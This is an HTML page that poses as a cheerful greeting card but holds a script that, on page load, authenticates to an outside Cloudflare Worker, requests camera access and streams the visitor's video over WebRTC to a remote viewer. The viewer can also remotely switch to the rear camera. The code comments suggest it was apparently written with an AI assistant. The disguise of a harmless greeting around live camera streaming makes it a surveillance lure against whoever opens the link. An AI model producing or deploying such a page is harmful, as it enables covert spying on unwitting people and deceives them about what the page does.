
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Hello</title>
<style>
* { box-sizing: border-box; }
body {
  margin: 0; min-height: 100vh; display: grid; place-items: center;
  padding: 20px; background: #f3f5f8;
  font-family: Arial, sans-serif; color: #202124;
}
.card {
  width: 100%; max-width: 390px; padding: 26px;
  background: white; border: 1px solid #e1e5eb;
  border-radius: 16px; box-shadow: 0 8px 28px #00000010;
}
.icon {
  display: grid; place-items: center; width: 44px; height: 44px;
  border-radius: 13px; background: #e8efff;
  color: #3158a6; font-size: 22px;
}
h1 { margin: 22px 0 8px; font-size: 25px; }
p { color: #5f6368; line-height: 1.5; font-size: 14px; }
.status {
  margin-top: 22px; padding: 12px; background: #f5f7fa;
  border-radius: 9px; font-size: 13px; overflow-wrap: anywhere;
}
.indicator { font-size: 12px; color: #237747; margin-top: 14px; }
</style>
</head>
<body>
<main class="card">
  <div class="icon">✦</div>
  <h1>Hello there!</h1>
  <p>Wishing you a great day. Your greeting page is ready.</p>
  <div class="indicator" id="cameraIndicator">Camera: inactive</div>
  <div class="status" id="status" role="status" aria-live="polite">
    Connecting…
  </div>
</main>

<script>
"use strict";

const WORKER_URL = "https://private-camera-signal.thundertest987.workers.dev";
const PHONE_SECRET = "CAMERA_PHONE_SECRET";
const AUTH_URL = WORKER_URL + "/auth";
const SIGNAL_URL = WORKER_URL.replace(/^https:/, "wss:") + "/session";

const statusBox = document.getElementById("status");
const cameraIndicator = document.getElementById("cameraIndicator");

let socket, peer, localStream;
let started = false;
let stopped = false;
let pendingOffer = null;
let facingMode = "user";

function status(text) {
  statusBox.textContent = text;
}

function send(type, data = null) {
  if (!socket || socket.readyState !== WebSocket.OPEN) return false;
  // This envelope matches the Worker code supplied in the conversation.
  socket.send(JSON.stringify({ type, data }));
  return true;
}

async function authenticate() {
  const response = await fetch(AUTH_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ role: "phone", secret: PHONE_SECRET })
  });
  if (!response.ok) throw new Error("Authentication failed (HTTP " + response.status + ").");
  const result = await response.json();
  if (!result.token) throw new Error("The Worker returned no token.");
  return result.token;
}

function connect(token) {
  return new Promise((resolve, reject) => {
    socket = new WebSocket(SIGNAL_URL);
    let ready = false;
    const timer = setTimeout(() => {
      if (!ready) {
        reject(new Error("Signaling authentication timed out."));
        socket.close();
      }
    }, 15000);

    socket.onopen = () => socket.send(JSON.stringify({ type: "auth", token }));

    socket.onmessage = async event => {
      let message;
      try { message = JSON.parse(event.data); } catch { return; }

      if (!ready) {
        if (message.type === "ready") {
          ready = true;
          clearTimeout(timer);
          resolve();
        } else if (message.type === "error" || message.error) {
          clearTimeout(timer);
          reject(new Error(message.error || "Signaling authentication failed."));
        }
        return;
      }

      // The Worker forwards payloads inside message.data.
      const data = message.data ?? message;
      await handleSignal({ ...data, type: message.type });
    };

    socket.onerror = () => {
      if (!ready) {
        clearTimeout(timer);
        reject(new Error("Could not connect to the signaling server."));
      }
    };

    socket.onclose = () => {
      clearTimeout(timer);
      if (!stopped) {
        stopCamera();
        closePeer();
        status("Connection closed. Reload to reconnect.");
      }
    };
  });
}

function createPeer() {
  closePeer();
  peer = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
  });

  peer.onicecandidate = event => {
    if (event.candidate) send("ice", { candidate: event.candidate });
  };

  peer.onconnectionstatechange = () => {
    if (!peer) return;
    if (peer.connectionState === "connected") {
      status("Connected to viewer.");
    } else if (peer.connectionState === "failed") {
      status("Connection failed. Your network may require a TURN server.");
    }
  };
  return peer;
}

async function startCamera() {
  if (started) return;

  if (!navigator.mediaDevices?.getUserMedia) {
    status("Camera access is unavailable. Open this page in a supported browser over HTTPS.");
    return;
  }

  try {
    status("Requesting camera permission…");
    localStream = await navigator.mediaDevices.getUserMedia({
      audio: false,
      video: {
        facingMode: { ideal: facingMode },
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    });

    started = true;
    cameraIndicator.textContent = "● Camera active";
    if (pendingOffer) {
      const offer = pendingOffer;
      pendingOffer = null;
      await answerOffer(offer);
    } else {
      status("Camera is active. Waiting for the viewer to connect.");
    }
  } catch (error) {
    stopCamera();
    status("Camera permission/startup failed: " + error.message);
  }
}

async function answerOffer(offer) {
  if (!offer || offer.type !== "offer" ||
      typeof offer.sdp !== "string" || !offer.sdp.startsWith("v=")) {
    status("Invalid WebRTC offer received.");
    return;
  }

  if (!localStream) {
    pendingOffer = offer;
    return;
  }

  try {
    const pc = peer || createPeer();
    for (const track of localStream.getTracks()) {
      if (!pc.getSenders().some(sender => sender.track === track)) {
        pc.addTrack(track, localStream);
      }
    }

    await pc.setRemoteDescription(offer);
    const answer = await pc.createAnswer();
    await pc.setLocalDescription(answer);
    send("answer", {
      answer: {
        type: pc.localDescription.type,
        sdp: pc.localDescription.sdp
      }
    });
    status("Connected session is negotiating video.");
  } catch (error) {
    status("WebRTC error: " + error.message);
  }
}

async function switchCamera(mode) {
  if (!["user", "environment"].includes(mode)) return;
  facingMode = mode;
  if (!started) return;

  let replacement;
  try {
    replacement = await navigator.mediaDevices.getUserMedia({
      audio: false, video: { facingMode: { ideal: mode } }
    });
    const track = replacement.getVideoTracks()[0];
    const sender = peer?.getSenders().find(s => s.track?.kind === "video");
    if (sender) await sender.replaceTrack(track);

    const old = localStream;
    localStream = replacement;
    old?.getTracks().forEach(t => t.stop());
    status("Camera switched.");
  } catch (error) {
    replacement?.getTracks().forEach(t => t.stop());
    status("Camera switch failed: " + error.message);
  }
}

async function handleSignal(message) {
  switch (message.type) {
    case "offer":
      await answerOffer(message.offer || message);
      break;
    case "ice":
      if (peer && message.candidate) {
        try { await peer.addIceCandidate(message.candidate); } catch {}
      }
      break;
    case "set-camera":
      await switchCamera(message.facingMode);
      break;
    case "hangup":
    case "peer-left":
      closePeer();
      status("Viewer disconnected.");
      break;
    case "peer-ready":
      status("Viewer connected. Waiting for its offer.");
      break;
  }
}

function stopCamera() {
  localStream?.getTracks().forEach(track => track.stop());
  localStream = null;
  started = false;
  cameraIndicator.textContent = "Camera: inactive";
}

function closePeer() {
  if (peer) {
    peer.onicecandidate = null;
    peer.close();
    peer = null;
  }
}

window.addEventListener("pagehide", () => {
  stopped = true;
  closePeer();
  stopCamera();
  socket?.close();
});

async function initialize() {
  try {
    status("Authenticating…");
    const token = await authenticate();
    await connect(token);
    status("Connected. Requesting camera permission…");
    await startCamera();
  } catch (error) {
    status(error.message);
  }
}

initialize();
</script>
</body>
</html>
